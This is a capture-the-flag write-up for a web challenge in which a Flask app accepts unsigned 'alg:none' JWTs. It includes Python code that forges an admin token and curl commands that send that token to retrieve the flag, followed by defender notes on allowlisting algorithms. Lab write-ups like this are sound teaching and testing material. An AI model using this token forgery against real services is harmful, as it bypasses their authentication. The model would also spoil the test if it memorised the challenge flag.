# LYKNCTF 2026 — Discord Nitro

> **Event:** LYKNCTF 2026 (July 6–8, 2026)
> **Category:** Web (JWT / Authentication Bypass)
> **Difficulty:** Easy
> **Flag:** `LYKNCTF{8ca07868c81c46549512df28e26bde1d}`
> **Source:** [GitHub — Challenge Source](https://github.com/Loi-Yeu-Kho-Noi/LYKNCTF-2026-Challenge/tree/main/Web/Discord%20Nitro)

---

## Table of Contents

- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Understanding the JWT](#understanding-the-jwt)
- [The Vulnerability: alg:none](#the-vulnerability-algnone)
- [Exploitation](#exploitation)
- [Getting the Flag](#getting-the-flag)
- [Tools Used](#tools-used)
- [Solver Script](#solver-script)
- [Defender Notes](#defender-notes)

---

## Overview

A two-page Flask app served via gunicorn. The landing page advertises a demo login (`guest`/`guest`). After logging in, the server issues a JWT in the `token` cookie. Visiting `/admin` is gated on `role=admin` — but the server accepts JWTs signed with `alg:none`, allowing anyone to forge an admin token without knowing the signing key.

## Reconnaissance

**Step 1 — Visit the landing page:**

```
GET /
```

Returns a login form with a demo account hint:

```
Demo account: guest / guest
```

**Step 2 — Log in as guest:**

```bash
curl -s -i -X POST -d 'username=guest&password=guest' \
     http://<TARGET>/login | head -12
```

Response:

```
HTTP/1.1 302 Found
Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.dCdGtxl1AM3Uk65cK67xMPkvOdoCmYZ2YAXd4-SykTs; HttpOnly; Path=/
Location: /home
```

**Step 3 — Visit /home:**

```
You are logged in with role: user. Your session is stored in the token cookie (a JWT).
```

Two buttons: `/admin` and `/logout`.

**Step 4 — Try /admin:**

```
HTTP/1.1 403 Forbidden
Access denied. You are logged in as user. Only accounts with the admin role can view the flag.
```

The entire game is: turn `role: user` into `role: admin`.

## Understanding the JWT

The `token` cookie is a standard JWT — three base64url segments separated by dots:

| Segment | Base64url | Decoded |
|---------|-----------|---------|
| Header | `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` | `{"alg":"HS256","typ":"JWT"}` |
| Payload | `eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9` | `{"user":"guest","role":"user"}` |
| Signature | `dCdGtxl1AM3Uk65cK67xMPkvOdoCmYZ2YAXd4-SykTs` | 32 bytes HMAC-SHA256 |

Two natural attack paths:

1. **`alg:none`** — RFC 7519 defines `alg:"none"` as the "unsecured JWS" option. If the server's decoder trusts the `alg` field to pick the verification routine, sending `alg:none` makes it skip signature verification entirely.
2. **Weak HS256 secret** — brute-force with `hashcat -m 16500` or `jwt_tool` + wordlist. Only worth trying if `none` is blocked.

`alg:none` costs exactly one request — try it first.

## The Vulnerability: alg:none

The JWT header specifies the signing algorithm. When the server reads `{"alg":"none"}`, it skips all signature verification. This is the classic "algorithm confusion" vulnerability.

RFC 7519 §5.2 states that the `alg` parameter is used by the JWT implementation to select the cryptographic algorithm. If the implementation blindly trusts this field without an allowlist, an attacker can set `alg:none` to bypass verification entirely.

## Exploitation

**Step 1 — Forge the token:**

```python
import base64, json

def b64(x):
    return base64.urlsafe_b64encode(x).rstrip(b'=').decode()

header = b64(json.dumps({"alg": "none", "typ": "JWT"}, separators=(',',':')).encode())
payload = b64(json.dumps({"user": "admin", "role": "admin"}, separators=(',',':')).encode())
forged_token = f"{header}.{payload}."
```

Resulting token:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
```

**Two critical implementation details:**

1. **The trailing dot is mandatory.** A JWT is three segments joined by dots. Dropping the third segment entirely (`hdr.payload`) breaks the shape and some decoders reject it before looking at `alg`. You must include the trailing dot: `hdr.payload.` (empty third segment).

2. **Compact JSON serialization.** Use `separators=(',',':')` to produce minimal JSON. If the server canonicalizes the header before hashing, extra whitespace (default Python `json.dumps` adds spaces after `,` and `:`) changes the digest.

## Getting the Flag

**Step 2 — Send the forged token:**

```bash
curl -s -H "Cookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ." \
     http://<TARGET>/admin | grep -oE 'LYKNCTF\{[^}]+\}'
```

Output:

```
LYKNCTF{8ca07868c81c46549512df28e26bde1d}
```

The admin panel response includes:

```html
<h1>Admin Panel</h1>
<p>Welcome, administrator! Here is your reward:</p>
<pre class="flag">LYKNCTF{8ca07868c81c46549512df28e26bde1d}</pre>
<p>Admin perk — claim your free Discord Nitro:</p>
```

The "free Discord Nitro" is an intentional joke — the real prize is the flag.

## Tools Used

| Tool | Purpose |
|------|---------|
| `curl` | HTTP requests, cookie manipulation |
| `base64` / Python `base64` module | JWT segment encoding |
| `jwt_tool` (optional) | Automated JWT manipulation (`jwt_tool <token> -X a`) |
| Browser DevTools | Inspect `token` cookie after login |

## Solver Script

See [exploit.py](exploit.py) for the full solver.

```bash
python3 exploit.py http://<TARGET>
```

## Defender Notes

- **Always use an allowlist for JWT algorithms.** Never let the client dictate which algorithm the server uses for verification. Modern JWT libraries (e.g., `PyJWT >= 2.0`) require you to explicitly specify the expected algorithm.
- **`alg:none` should never be accepted** for any endpoint that makes authorization decisions based on JWT claims.
- **The `guest`/`guest` demo credential is not just flavor.** It exists so you can inspect the token shape. Treat every demo credential as an invitation to inspect the session mechanism.

---

## References

- [RFC 7519 — JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519)
- [RFC 7515 — JSON Web Signature (JWS)](https://tools.ietf.org/html/rfc7515)
- [Challenge Source — GitHub](https://github.com/Loi-Yeu-Kho-Noi/LYKNCTF-2026-Challenge/tree/main/Web/Discord%20Nitro)
- [Writeup Source — Abdelkad3r/LYKNCTF](https://github.com/Abdelkad3r/LYKNCTF/tree/main/web/discord-nitro)
